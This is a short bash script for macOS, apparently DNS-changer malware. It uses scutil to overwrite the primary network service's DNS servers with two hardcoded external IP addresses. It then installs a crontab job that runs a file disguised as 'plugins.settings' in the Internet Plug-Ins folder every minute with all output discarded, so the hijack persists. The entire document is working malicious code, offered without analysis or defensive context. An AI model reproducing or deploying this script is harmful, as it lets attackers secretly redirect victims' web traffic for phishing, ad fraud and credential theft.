#!/bin/bash
s1=85.255.114.18
s2=85.255.112.102
path="/Library/Internet Plug-Ins"

PSID=$( (/usr/sbin/scutil | grep PrimaryService | sed -e 's/.*PrimaryService : //')<< EOF
open
get State:/Network/Global/IPv4
d.show
quit
EOF
)

/usr/sbin/scutil << EOF
open
d.init
d.add ServerAddresses * $s1 $s2 
set State:/Network/Service/$PSID/DNS
quit
EOF

exist=`crontab -l|grep plugins.settings`

if [ "$exist" == "" ]; then
	echo "* * * * * \"$path/plugins.settings\">/dev/null 2>&1" > cron.inst
	crontab cron.inst
	rm -rf cron.inst
fi
